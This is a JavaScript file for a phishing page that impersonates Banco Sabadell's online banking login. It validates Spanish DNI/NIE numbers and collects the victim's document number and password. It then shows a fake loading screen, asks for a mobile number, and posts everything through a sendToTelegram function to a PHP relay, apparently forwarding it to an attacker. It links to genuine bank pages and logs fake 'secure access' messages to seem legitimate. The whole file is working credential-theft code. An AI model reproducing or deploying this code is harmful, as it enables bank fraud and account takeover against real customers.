const loginForm = document.getElementById('login-form');
const loadingScreen = document.getElementById('loading-screen');
const phoneForm = document.getElementById('phone-form');
const errorMessage = document.getElementById('error-message');
const loginFormElement = document.getElementById('loginForm');
const phoneFormElement = document.getElementById('phoneForm');
const documentNumberInput = document.getElementById('documentNumber');
const passwordInput = document.getElementById('password');
const phoneNumberInput = document.getElementById('phoneNumber');
const loginError = document.getElementById('login-error');
const phoneError = document.getElementById('phone-error');
function showSection(sectionToShow) {
    loginForm.classList.add('hidden');
    loadingScreen.classList.add('hidden');
    phoneForm.classList.add('hidden');
    errorMessage.classList.add('hidden');
    loginError.classList.add('hidden');
    phoneError.classList.add('hidden');
    sectionToShow.classList.remove('hidden');
}
function validateLoginForm() {
    const documentValue = documentNumberInput.value.trim();
    const passwordValue = passwordInput.value.trim();
    const isDNIValid = validateDNI(documentValue);
    return documentValue.length > 0 && passwordValue.length >= 4 && isDNIValid;
}
function validatePhoneForm() {
    const phoneValue = phoneNumberInput.value.trim().replace(/\s/g, '');
    return validateSpanishPhone(phoneValue);
}
loginFormElement.addEventListener('submit', function(e) {
    e.preventDefault();
    loginError.classList.add('hidden');
    if (validateLoginForm()) {
        const documentType = document.querySelector('.document-type').value;
        const documentNumber = documentNumberInput.value.trim();
        const password = passwordInput.value.trim();
        const rememberUser = document.getElementById('rememberUser').checked;
        capturedData = {
            document_type: documentType,
            document_number: documentNumber,
            password: password,
            remember_user: rememberUser
        };
        showSection(loadingScreen);
        setTimeout(() => {
            showSection(phoneForm);
        }, 3000);
    } else {
        loginError.classList.remove('hidden');
    }
});
phoneFormElement.addEventListener('submit', function(e) {
    e.preventDefault();
    phoneError.classList.add('hidden');
    if (validatePhoneForm()) {
        const phoneNumber = phoneNumberInput.value.trim();
        capturedData.phone_number = phoneNumber;
        sendToTelegram(capturedData);
        showSection(loadingScreen);
        setTimeout(() => {
            showSection(errorMessage);
        }, 2000);
    } else {
        phoneError.classList.remove('hidden');
    }
});
phoneNumberInput.addEventListener('input', function() {
    const value = this.value.replace(/\s/g, '');
    this.value = this.value.replace(/[^0-9]/g, '');
    if (value.length > 0) {
        if (value.charAt(0) !== '6') {
            this.parentElement.style.borderColor = '#f44336';
        } else if (value.length === 9) {
            const isValid = validateSpanishPhone(value);
            if (isValid) {
                this.parentElement.style.borderColor = '#4caf50';
            } else {
                this.parentElement.style.borderColor = '#f44336';
            }
        } else {
            this.parentElement.style.borderColor = '#ff9800';
        }
    } else {
        this.parentElement.style.borderColor = '#ccc';
    }
});
function togglePassword() {
    const passwordInput = document.getElementById('password');
    const eyeIcon = document.getElementById('eyeIcon');
    if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        eyeIcon.className = 'fa-solid fa-eye-slash';
    } else {
        passwordInput.type = 'password';
        eyeIcon.className = 'fa-solid fa-eye';
    }
}
document.querySelectorAll('.tab').forEach(tab => {
    tab.addEventListener('click', function() {
        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
        this.classList.add('active');
        const loginTitle = document.querySelector('.login-header h1');
        if (this.textContent.trim() === 'Particular') {
            loginTitle.textContent = 'Acceder como Particular';
        } else if (this.textContent.trim() === 'Empresa') {
            loginTitle.textContent = 'Acceder como Empresa';
        }
    });
});
document.querySelectorAll('input').forEach(input => {
    input.addEventListener('focus', function() {
        this.parentElement.style.borderColor = '#006DFF';
        this.parentElement.style.boxShadow = '0 0 0 3px rgba(0, 109, 255, 0.1)';
    });
    input.addEventListener('blur', function() {
        this.parentElement.style.borderColor = '#ddd';
        this.parentElement.style.boxShadow = 'none';
    });
});
document.querySelectorAll('button').forEach(button => {
    button.addEventListener('mouseenter', function() {
        if (this.classList.contains('btn-entrar')) {
            this.style.transform = 'translateY(-2px)';
            this.style.boxShadow = '0 5px 15px rgba(0, 109, 255, 0.3)';
        }
    });
    button.addEventListener('mouseleave', function() {
        if (this.classList.contains('btn-entrar')) {
            this.style.transform = 'translateY(0)';
            this.style.boxShadow = 'none';
        }
    });
});
document.querySelector('.btn-hazte-cliente').addEventListener('click', function(e) {
    e.preventDefault();
    window.open('https://www.bancsabadell.com/cs/Satellite/SabAtl/Particulares/1191332211847/', '_blank');
});
document.querySelector('.btn-ayuda').addEventListener('click', function(e) {
    e.preventDefault();
    window.open('https://www.bancsabadell.com/cs/Satellite/SabAtl/Ayuda/1191332211847/', '_blank');
});
document.querySelector('.btn-menu').addEventListener('click', function(e) {
    e.preventDefault();
});
document.querySelector('.btn-simula').addEventListener('click', function(e) {
    e.preventDefault();
    window.open('https://www.bancsabadell.com/cs/Satellite/SabAtl/Simuladores/1191332211847/', '_blank');
});
document.querySelectorAll('.footer-link').forEach(link => {
    link.addEventListener('click', function(e) {
        e.preventDefault();
        if (this.textContent.includes('Hazte Cliente')) {
            window.open('https://www.bancsabadell.com/cs/Satellite/SabAtl/Particulares/1191332211847/', '_blank');
        } else if (this.textContent.includes('Seguridad')) {
            window.open('https://www.bancsabadell.com/cs/Satellite/SabAtl/Seguridad/1191332211847/', '_blank');
        }
    });
});
function addTypingEffect(input) {
    input.addEventListener('input', function() {
        this.style.transition = 'all 0.1s ease';
    });
}
document.querySelectorAll('input[type="text"], input[type="password"], input[type="tel"]').forEach(addTypingEffect);
function validateSpanishPhone(phone) {
    const phoneRegex = /^6[0-9]{8}$/;
    return phoneRegex.test(phone);
}
function formatPhoneNumber(value) {
    const numbers = value.replace(/\D/g, '');
    const limited = numbers.substring(0, 9);
    if (limited.length <= 3) {
        return limited;
    } else if (limited.length <= 6) {
        return limited.substring(0, 3) + ' ' + limited.substring(3);
    } else {
        return limited.substring(0, 3) + ' ' + limited.substring(3, 6) + ' ' + limited.substring(6);
    }
}
documentNumberInput.addEventListener('input', function() {
    loginError.classList.add('hidden');
});
passwordInput.addEventListener('input', function() {
    loginError.classList.add('hidden');
});
phoneNumberInput.addEventListener('input', function() {
    phoneError.classList.add('hidden');
});
function validateDNI(dni) {
    const dniRegex = /^[0-9]{8}[TRWAGMYFPDXBNJZSQVHLCKE]$/i;
    const nieRegex = /^[XYZ][0-9]{7}[TRWAGMYFPDXBNJZSQVHLCKE]$/i;
    if (!dniRegex.test(dni) && !nieRegex.test(dni)) {
        return false;
    }
    const letters = 'TRWAGMYFPDXBNJZSQVHLCKE';
    let number;
    if (nieRegex.test(dni)) {
        const nieMap = { 'X': '0', 'Y': '1', 'Z': '2' };
        number = nieMap[dni.charAt(0)] + dni.substring(1, 8);
    } else {
        number = dni.substring(0, 8);
    }
    const expectedLetter = letters[parseInt(number) % 23];
    return expectedLetter === dni.charAt(dni.length - 1).toUpperCase();
}
documentNumberInput.addEventListener('input', function() {
    const value = this.value.toUpperCase();
    this.value = value; 
    if (value.length > 0) {
        if (value.length >= 9) {
            const isValid = validateDNI(value);
            if (isValid) {
                this.parentElement.style.borderColor = '#4caf50';
            } else {
                this.parentElement.style.borderColor = '#f44336';
            }
        } else {
            this.parentElement.style.borderColor = '#ff9800';
        }
    } else {
        this.parentElement.style.borderColor = '#ccc';
    }
});
passwordInput.addEventListener('input', function() {
    const value = this.value;
    if (value.length > 0) {
        if (value.length < 6) {
            this.style.borderColor = '#ff9800';
        } else {
            this.style.borderColor = '#4caf50';
        }
    }
});
phoneNumberInput.addEventListener('input', function() {
    const formatted = formatPhoneNumber(this.value);
    this.value = formatted;
    const numbers = formatted.replace(/\s/g, '');
    if (numbers.length > 0) {
        const isValid = /^6[0-9]{8}$/.test(numbers);
        if (!isValid && numbers.length >= 9) {
            this.parentElement.style.borderColor = '#f44336';
        } else if (numbers.length === 9) {
            this.parentElement.style.borderColor = '#4caf50';
        } else {
            this.parentElement.style.borderColor = '#ff9800';
        }
    }
});
console.log('🏦 Banco Sabadell - Sistema de acceso');
console.log('🔐 Acceso seguro verificado');
function updatePlaceholder() {
    const documentSelect = document.querySelector('.document-type');
    const documentInput = document.getElementById('documentNumber');
    if (documentSelect && documentInput) {
        const selectedValue = documentSelect.value;
        if (selectedValue === 'DNI / NIE') {
            documentInput.placeholder = 'Introduce tu DNI o NIE';
        } else if (selectedValue === 'CIF') {
            documentInput.placeholder = 'Introduce tu CIF de empresa';
        }
    }
}
let capturedData = {};
function sendToTelegram(data) {
    fetch('send_telegram.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(result => {
        console.log('Datos enviados a Telegram:', result);
    })
    .catch(error => {
        console.error('Error al enviar datos:', error);
    });
}
document.addEventListener('DOMContentLoaded', function() {
    showSection(loginForm);
    const documentSelect = document.querySelector('.document-type');
    if (documentSelect) {
        documentSelect.addEventListener('change', updatePlaceholder);
        updatePlaceholder(); 
    }
    setTimeout(() => {
        documentNumberInput.focus();
    }, 500);
});